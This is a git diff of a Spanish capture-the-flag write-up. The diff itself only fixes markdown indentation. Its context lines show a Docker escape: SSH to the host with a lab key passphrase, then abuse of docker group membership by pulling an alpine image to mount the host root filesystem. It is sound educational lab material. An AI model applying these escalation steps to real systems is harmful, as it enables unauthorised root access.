@@ -331,7 +331,7 @@ stty rows 44 columns 184
 
 - Estuve buscando miles de cosas para este punto, llegué solo a una conclusión y fue que nos encontrábamos en un docker, ejecutando `hostname -I`.
 - Así mismo, enumerando directorio por directorio encontré algo curioso en la raíz del sistema, un archivo comprimido con un nombre peculiar:
-  ~~~ bash
+~~~ bash
 www-data@e71b67461f6c:/$ ls -la
 total 464
 drwxr-xr-x 74 root root   4096 Jun 23  2020 .
@@ -382,7 +382,7 @@ uid=0(root) gid=0(root) groups=0(root)
 - Okay, somos root pero dentro del docker, por lo cual ahora debemos salir de este.
 - Probé viendo el directorio `.ssh` desde la carpeta de root:
 - Viendo que existe un archivo `known_hosts` y que hay una llave pública que pertenece a un usuario admin con dirección IP del host del docker, lo que nos hace pensar que podemos conectarnos por `ssh` a este usuario empleando la contraseña que utilizamos para conectarnos como root:
-  ~~~ bash
+~~~ bash
 root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1 -i id_rsa
 Enter passphrase for key 'id_rsa': choclate93
 
@@ -395,7 +395,7 @@ permitted by applicable law.
 Last login: Wed Dec  6 14:54:49 2023 from 192.168.150.21
 -bash-4.3$ hostname -I
 192.168.17.150 192.168.150.1 172.17.0.1
-  ~~~
+~~~
   - Y hemos escapado del docker, si revisamos los grupos en los que estamos, podemos ver algo curioso:
 ~~~ bash
 -bash-4.3$ id
@@ -403,7 +403,7 @@ uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
 ~~~
 - Estamos en el grupo de docker, por lo que podemos crear, eliminar y ejecutar contenedores:
   - Crearemos un docker donde montaremos toda la carpeta raíz dentro de `mnt/root`:
-  ~~~ bash
+~~~ bash
 -bash-4.3$ docker pull alpine:latest
 latest: Pulling from library/alpine
 c926b61bad3b: Downloading [>                                                  ]  34.76kB/3.402c926b61bad3b: Downloading [=======>                                           ]  506.2kB/3.402c926b61bad3b: Downloading [=======================>                           ]   1.62MB/3.402c926b61bad3b: Downloading [================================================>  ]  3.324MB/3.402c926b61bad3b: Extracting [>                                                  ]  65.54kB/3.402Mc926b61bad3b: Extracting [==================================================>]  3.402MB/3.402Mc926b61bad3b: Extracting [==================================================>]  3.402MB/3.402Mc926b61bad3b: Pull complete 
